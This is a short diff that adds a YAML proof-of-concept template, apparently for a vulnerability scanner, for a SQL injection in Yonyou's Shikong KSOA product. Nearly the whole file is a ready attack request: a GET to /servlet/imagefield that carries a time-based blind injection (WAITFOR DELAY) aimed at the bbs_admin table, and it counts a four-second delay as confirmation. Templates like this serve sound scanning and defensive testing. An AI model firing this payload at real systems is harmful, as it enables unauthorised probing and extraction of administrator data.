@@ -1,0 +1,8 @@
+name: poc-yaml-用友-时空KSOA-sql
+description: "SQL注入"
+method: GET
+path:
+  - /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:4%27--
+expression:
+  status: 200
+  sleep: 4
